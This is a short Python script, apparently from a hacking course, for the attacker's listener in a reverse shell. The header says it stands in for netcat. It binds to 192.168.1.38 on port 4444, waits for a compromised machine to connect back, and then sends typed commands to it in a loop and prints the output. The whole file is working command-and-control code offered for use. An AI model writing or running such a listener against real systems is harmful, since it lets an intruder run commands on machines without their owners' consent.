# Setting up server to listen to incoming connections instead of using netcat

import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)  # specifying a backlog
        print("[+] Waiting for connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from" + str(address))

    def execute_remotely(self, command):
        self.connection.send(command)
        return self.connection.recv(1024)


    def run(self):
        while True:
            command = input(">> ").encode()
            result = self.execute_remotely(command)
            print(result)



my_listener = Listener("192.168.1.38", 4444)
my_listener.run()
